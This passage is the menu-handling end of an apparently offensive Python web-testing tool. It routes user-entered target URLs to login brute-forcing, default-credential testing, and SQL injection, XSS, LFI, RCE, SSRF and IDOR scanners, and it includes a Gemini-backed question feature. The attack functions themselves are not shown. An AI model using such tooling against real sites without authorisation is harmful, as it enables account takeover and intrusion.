                username_field = input(f"{self.c('[?]', 'cyan')} Username field (default: username): ").strip() or 'username'
                password_field = input(f"{self.c('[?]', 'cyan')} Password field (default: password): ").strip() or 'password'
                threads = input(f"{self.c('[?]', 'cyan')} Threads (default: 5): ").strip()
                threads = int(threads) if threads.isdigit() else 5
                
                self.advanced_brute_force(url, username_field, password_field, threads)
            
            elif choice == '6':  # Default Creds
                url = input(f"{self.c('[?]', 'cyan')} Enter login URL: ").strip()
                if not url.startswith('http'):
                    url = 'http://' + url
                
                self.default_creds_tester(url)
            
            elif choice == '7':  # SQL Injection
                url = input(f"{self.c('[?]', 'cyan')} Enter URL with parameters: ").strip()
                if not url.startswith('http'):
                    url = 'http://' + url
                
                self.advanced_sqli_scanner(url)
            
            elif choice == '8':  # XSS
                url = input(f"{self.c('[?]', 'cyan')} Enter URL with parameters: ").strip()
                if not url.startswith('http'):
                    url = 'http://' + url
                
                self.advanced_xss_scanner(url)
            
            elif choice == '9':  # LFI
                url = input(f"{self.c('[?]', 'cyan')} Enter URL with parameters: ").strip()
                if not url.startswith('http'):
                    url = 'http://' + url
                
                self.advanced_lfi_scanner(url)
            
            elif choice == '10':  # RCE
                url = input(f"{self.c('[?]', 'cyan')} Enter URL with parameters: ").strip()
                if not url.startswith('http'):
                    url = 'http://' + url
                
                self.advanced_rce_scanner(url)
            
            elif choice == '12':  # SSRF
                url = input(f"{self.c('[?]', 'cyan')} Enter URL with parameters: ").strip()
                if not url.startswith('http'):
                    url = 'http://' + url
                
                self.test_ssrf(url)
            
            elif choice == '11':  # IDOR
                url = input(f"{self.c('[?]', 'cyan')} Enter URL with parameters: ").strip()
                if not url.startswith('http'):
                    url = 'http://' + url
                
                self.test_idor(url)
            
            elif choice == '15':  # Source Analyzer
                url = input(f"{self.c('[?]', 'cyan')} Enter target URL: ").strip()
                if not url.startswith('http'):
                    url = 'http://' + url
                
                self.advanced_source_analyzer(url)
            
            elif choice == '16':  # Subdomain Scanner
                domain = input(f"{self.c('[?]', 'cyan')} Enter domain (example.com): ").strip()
                self.subdomain_scanner(domain)
            
            elif choice == '18':  # Sensitive Files
                url = input(f"{self.c('[?]', 'cyan')} Enter base URL: ").strip()
                if not url.startswith('http'):
                    url = 'http://' + url
                
                self.sensitive_files_scanner(url)
            
            elif choice == '19':  # Tech Detection
                url = input(f"{self.c('[?]', 'cyan')} Enter target URL: ").strip()
                if not url.startswith('http'):
                    url = 'http://' + url
                
                self.tech_detection(url)
            
            elif choice == '20':  # Detailed Report
                if not self.vulnerabilities and not self.admin_panels:
                    self.print_message("[⚠️] No scan data available. Run a scan first.", 'yellow')
                else:
                    scan_results = {
                        'url': 'Last Scan',
                        'duration': 'N/A',
                        'vulnerabilities': self.vulnerabilities
                    }
                    self.generate_detailed_report('last_scan', scan_results)
            
            elif choice == '21':  # AI Analysis
                question = input(f"{self.c('[?]', 'cyan')} Ask your security question: ").strip()
                self.animate_thinking(2)
                answer = self.ask_gemini(f"As a cybersecurity expert, answer in Arabic: {question}")
                self.print_message(f"\n🤖 AI:", 'green', True)
                self.type_text(answer, 0.02)
            
            elif choice == '22':  # History
                if not self.scan_history:
                    self.print_message("[⚠️] No scan history available.", 'yellow')
                else:
                    self.print_message(f"\n{self.c('📜 SCAN HISTORY', 'green', True)}", 'cyan')
                    for i, scan in enumerate(self.scan_history[-10:], 1):  # آخر 10 scans
                        self.print_message(f"  {i}. {scan['url']} - {scan['timestamp']} - Vulns: {scan['vulns_count']}", 'cyan')
            
            elif choice == '23':  # Stats
                self.show_stats()
            
            else:
                self.print_message(f"\n[❌] Invalid choice. Please try again.", 'red')
            
            if choice != '0':
                input(f"\n{self.c('[Press Enter to continue...]', 'blue')}")

if __name__ == "__main__":
    bot = ALONE_Ultimate()
    bot.run()